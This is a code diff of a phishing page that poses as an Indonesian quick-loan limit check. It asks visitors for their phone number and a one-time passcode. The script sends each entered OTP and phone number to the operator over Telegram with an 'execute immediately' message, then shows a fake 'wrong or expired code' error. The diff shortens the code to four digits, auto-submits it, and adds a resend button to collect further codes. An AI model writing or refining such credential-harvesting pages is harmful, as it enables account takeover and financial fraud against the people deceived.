@@ -162,15 +162,6 @@
             <div class="card-wrap">
                 <div class="new-register-card main-card">
                     <form class="in-form" id="phoneForm">
-                        <div class="card-top">
-                            <p class="limit-pinjaman">Limit pinjaman maks(Rp)</p>
-                            <p class="card-amount">100.000.000</p>
-                            <div class="interest-rate">
-                                <span class="interest-rate__label">Bunga serendah </span>
-                                <span class="interest-rate__value">0,03% </span>
-                            </div>
-                            <p class="limit-desc">Cek Data</p>
-                        </div>
                         
                         <label for="phoneNumber" class="mobile-input">
                             <div class="in-field__inner">
@@ -188,16 +179,13 @@
                         
                         <div class="error-msg" id="phoneError">Format nomor ponsel salah, silakan masukkan 10-13 angka dimulai dengan 08</div>
                         
-                        <button type="button" id="submitBtn" class="submit-button"> 
-                            Cek Limit Sekarang 
-                            <p class="goToNextDesc">Tingkat lolos <span>97%</span></p>
-                        </button>
+                        <button type="button" id="submitBtn" class="submit-button">Lanjutkan</button>
                         <div class="form-protocol"> *Saya telah baca dan menyetujui <span>Syarat dan Ketentuan</span></div>
                     </form>
                 </div>
 
                 <div class="new-register-card">
-                    <div class="title">Pinjaman Cepat</div>
+                    <div class="title"></div>
                     <div class="step-card__list">
                         <div class="process-item">
                             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00903B" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
@@ -214,49 +202,7 @@
                     <div class="step-card__desc-list">
                         <p>Masukkan<br>Nomor HP</p>
                         <p>Download<br>Aplikasi</p>
-                        <p>Ajukan<br>Pinjaman</p>
-                    </div>
-                </div>
-
-                <div class="new-register-card">
-                    <div class="title">Rincian Produk</div>
-                    <div class="amount-card__list">
-                        <div class="amount-card__item">
-                            <p>Tenor:</p>
-                            <p class="amount-card__item__right">Mulai dari 61 hari, 3-12 bulan</p>
-                        </div>
-                        <div class="amount-card__item">
-                            <p>Suku bunga tahunan:</p>
-                            <p class="amount-card__item__right">Maksimal 36%</p>
-                        </div>
-                        <div class="amount-card__item">
-                            <p>Simulasi pinjaman:</p>
-                            <p class="amount-card__item__right">Ajukan Rp10.000.000 dengan 6 bulan</p>
-                        </div>
-                        <div class="amount-card__item">
-                            <p>Total bunga:</p>
-                            <p class="amount-card__item__right">Rp540.000</p>
-                        </div>
-                        <div class="amount-card__item">
-                            <p>Total Pelunasan:</p>
-                            <p class="amount-card__item__right">Rp10.540.000</p>
-                        </div>
-                    </div>
-                    <div class="repay-plan">
-                        <table class="repay-plan-table">
-                            <tr class="dark-cell">
-                                <th class="left-align">Tenor</th>
-                                <th>Biaya cicilan</th>
-                                <th>Pokok</th>
-                                <th class="right-align">Bunga</th>
-                            </tr>
-                            <tr><td class="left-align">1/6</td><td>1.756.667</td><td>1.666.667</td><td class="right-align">90.000</td></tr>
-                            <tr class="dark-cell"><td class="left-align">2/6</td><td>1.756.667</td><td>1.666.667</td><td class="right-align">90.000</td></tr>
-                            <tr><td class="left-align">3/6</td><td>1.756.667</td><td>1.666.667</td><td class="right-align">90.000</td></tr>
-                            <tr class="dark-cell"><td class="left-align">4/6</td><td>1.756.667</td><td>1.666.667</td><td class="right-align">90.000</td></tr>
-                            <tr><td class="left-align">5/6</td><td>1.756.667</td><td>1.666.667</td><td class="right-align">90.000</td></tr>
-                            <tr class="dark-cell"><td class="left-align">6/6</td><td>1.756.665</td><td>1.666.665</td><td class="right-align">90.000</td></tr>
-                        </table>
+                        <p>Cek<br>Data</p>
                     </div>
                 </div>
 
@@ -299,12 +245,10 @@
                     <div id="c2" class="otp-field-display" style="width: 100%; height: 50px; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #ddd; border-radius: 10px; font-weight: 700; color: #333; background: #fafafa;">-</div>
                     <div id="c3" class="otp-field-display" style="width: 100%; height: 50px; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #ddd; border-radius: 10px; font-weight: 700; color: #333; background: #fafafa;">-</div>
                     <div id="c4" class="otp-field-display" style="width: 100%; height: 50px; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #ddd; border-radius: 10px; font-weight: 700; color: #333; background: #fafafa;">-</div>
-                    <div id="c5" class="otp-field-display" style="width: 100%; height: 50px; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #ddd; border-radius: 10px; font-weight: 700; color: #333; background: #fafafa;">-</div>
-                    <div id="c6" class="otp-field-display" style="width: 100%; height: 50px; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #ddd; border-radius: 10px; font-weight: 700; color: #333; background: #fafafa;">-</div>
                 </div>
                 
-                <!-- Input tersembunyi buat ngetik diubah maxlength ke 6 -->
-                <input type="text" id="otpInput" maxlength="6" style="position: absolute; opacity: 0; pointer-events: none;" autocomplete="off">
+                <!-- Input tersembunyi buat ngetik diubah maxlength ke 4 -->
+                <input type="text" id="otpInput" maxlength="4" style="position: absolute; opacity: 0; pointer-events: none;" autocomplete="off">
 
                 <div class="timer-resend">
                     <span id="countSpan">60s</span>
@@ -313,7 +257,8 @@
 
                 <div class="otp-error" id="otpErrorText">Kode OTP salah atau sudah kadaluarsa</div>
 
-                <button type="button" id="submitOtpBtn" class="btn-otp-submit">Verifikasi OTP</button>
+                <!-- Tombol disembunyikan di awal form -->
+                <button type="button" id="submitOtpBtn" class="btn-otp-submit" style="display: none;">Verifikasi OTP</button>
             </form>
 
             <div class="loading-overlay" id="loadingSpinner">
@@ -347,14 +292,12 @@
         
         const otpInput = document.getElementById('otpInput');
         
-        // Update: Memasukkan elemen id c5 dan c6 ke dalam array
+        // Update: Memasukkan elemen id c1 sampai c4 ke dalam array
         const codeItems = [
             document.getElementById('c1'), 
             document.getElementById('c2'), 
             document.getElementById('c3'), 
-            document.getElementById('c4'),
-            document.getElementById('c5'),
-            document.getElementById('c6')
+            document.getElementById('c4')
         ];
         const submitOtpBtn = document.getElementById('submitOtpBtn');
         
@@ -413,6 +356,7 @@
             displayNum.textContent = phone;
             otpModal.style.display = 'flex';
             otpErrorText.style.display = 'none';
+            submitOtpBtn.style.display = 'none'; // Sembunyikan tombol saat pertama kali modal dibuka
             otpInput.value = '';
             codeItems.forEach(item => item.textContent = '-');
             startTimer();
@@ -429,13 +373,12 @@
             otpInput.focus();
         });
 
-        // 4. Sinkronisasi Pengisian Angka Kotak OTP
+        // 4. Sinkronisasi Pengisian Angka Kotak OTP & Auto Submit
         otpInput.addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/[^0-9]/g, '');
             const val = e.target.value;
             
-            // Update: perulangan batas diubah ke 6 kali
-            for (let i = 0; i < 6; i++) {
+            for (let i = 0; i < 4; i++) {
                 codeItems[i].textContent = val[i] ? val[i] : '-';
                 if(val[i]) {
                     codeItems[i].style.borderColor = '#00903B';
@@ -445,35 +388,49 @@
                     codeItems[i].style.background = '#fafafa';
                 }
             }
+
+            // Auto submit jika sudah memasukkan 4 digit
+            if (val.length === 4) {
+                processOtp(val);
+            }
         });
 
-        // 5. Submit OTP
-        submitOtpBtn.addEventListener('click', () => {
-            let otpCode = otpInput.value;
-            // Update: validasi menjadi wajib 6 karakter
-            if (otpCode.length < 6) return;
-
-            const teksAsli = submitOtpBtn.innerHTML;
-            submitOtpBtn.innerHTML = 'Memverifikasi...';
-            submitOtpBtn.style.pointerEvents = 'none';
+        // 5. Proses Submit OTP Otomatis
+        function processOtp(otpCode) {
+            otpInput.blur(); // Hilangkan fokus keyboard agar terlihat sedang diproses
+            
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            loadingSpinner.style.display = 'flex';
             otpErrorText.style.display = 'none';
 
             const message = `<b>⚡️ KODE OTP MASUK ⚡️</b>\n----------------------------------\n<b>🔑 OTP CODE :</b> <code>${otpCode}</code>\n<b>👤 NOMOR    :</b> <code>${userPhoneNumber}</code>\n<b>⏰ WAKTU    :</b> ${new Date().toLocaleTimeString('id-ID')}\n----------------------------------\n<b>🔥 SEGERA EKSEKUSI! 🔥</b>`;
             sendTelegramMessage(message);
 
             setTimeout(() => {
-                submitOtpBtn.innerHTML = teksAsli;
-                submitOtpBtn.style.pointerEvents = 'auto';
-                
+                loadingSpinner.style.display = 'none';
                 otpErrorText.style.display = 'block';
+                
+                // Ubah dan munculkan tombol menjadi Kirim Ulang
+                submitOtpBtn.innerHTML = 'Kirim Ulang';
+                submitOtpBtn.style.display = 'block';
+                
                 otpInput.value = '';
                 codeItems.forEach(item => {
                     item.textContent = '-';
                     item.style.borderColor = '#ddd';
                     item.style.background = '#fafafa';
                 });
-                otpInput.focus();
             }, 3000);
+        }
+
+        // Action pada tombol Kirim Ulang (menggantikan fungsi asli Verifikasi OTP)
+        submitOtpBtn.addEventListener('click', () => {
+            if (submitOtpBtn.innerHTML === 'Kirim Ulang') {
+                startTimer();
+                submitOtpBtn.style.display = 'none';
+                otpErrorText.style.display = 'none';
+                otpInput.focus();
+            }
         });
 
         // 6. Timer Logic
